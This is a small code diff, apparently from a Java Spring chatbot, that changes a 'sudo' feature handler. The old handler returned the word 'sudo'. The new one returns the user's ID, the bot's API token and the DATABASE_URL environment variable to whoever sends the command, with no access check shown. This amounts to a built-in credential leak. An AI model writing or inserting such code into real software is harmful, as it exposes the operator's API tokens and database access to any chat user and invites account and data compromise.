@@ -7,7 +7,7 @@ package com.example.bot.spring;
 public class FeatureSudo implements Features {
 	private String result=null;
 	public String call(User user, String text) {
-		result="sudo";
+		result="User ID: "+user.getUserID()	+ "\nAPI Token: " + DialogueFlow.getToken()	+ "\nDatabase_URL:" + System.getenv("DATABASE_URL");
 		return result;
 	}
 	
